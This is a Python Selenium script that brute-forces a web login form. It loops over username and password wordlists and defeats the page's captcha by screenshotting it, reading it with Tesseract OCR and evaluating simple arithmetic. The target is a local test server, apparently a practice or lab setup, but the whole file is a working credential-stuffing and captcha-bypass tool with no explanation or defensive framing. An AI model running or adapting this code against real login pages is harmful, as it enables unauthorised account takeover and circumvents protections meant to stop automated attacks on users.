import time
import pytesseract
from PIL import Image
from selenium import webdriver
from selenium.webdriver.common.by import By
import re

pytesseract.pytesseract.tesseract_cmd = r"C:\Program Files\Tesseract-OCR\tesseract.exe"

driver = webdriver.Chrome()
driver.get("http://127.0.0.1:5000/")
time.sleep(2)

# Load credentials
with open("usernames.txt") as f:
    usernames = [line.strip() for line in f]

with open("passwords.txt") as f:
    passwords = [line.strip() for line in f]

def solve_captcha():
    driver.save_screenshot("page.png")
    img = driver.find_element(By.TAG_NAME, "img")
    img.screenshot("captcha.png")

    image = Image.open("captcha.png")
    raw_text = pytesseract.image_to_string(image).strip()
    print(f"OCR Raw: {raw_text}")

    # Try to detect if it's a math captcha
    match = re.search(r'(\d+)\s*([\+\-])\s*(\d+)', raw_text)
    if match:
        a, op, b = match.groups()
        result = str(eval(f"{a}{op}{b}"))
        print(f"Math CAPTCHA Detected: {a} {op} {b} = {result}")
        return result
    else:
        print(f"Text CAPTCHA Detected: {raw_text}")
        return raw_text.replace("-", "").strip()

success = False

for username in usernames:
    for password in passwords:
        driver.get("http://127.0.0.1:5000/")
        time.sleep(2)

        captcha_text = solve_captcha()

        driver.find_element(By.NAME, "username").send_keys(username)
        driver.find_element(By.NAME, "password").send_keys(password)
        driver.find_element(By.NAME, "captcha").send_keys(captcha_text)
        driver.find_element(By.TAG_NAME, "button").click()

        time.sleep(2)
        if "✅ Logged in" in driver.page_source:
            print(f"🎉 SUCCESS: {username}:{password}")
            success = True
            break
        else:
            print(f"❌ Failed: {username}:{password}")

    if success:
        break

driver.quit()
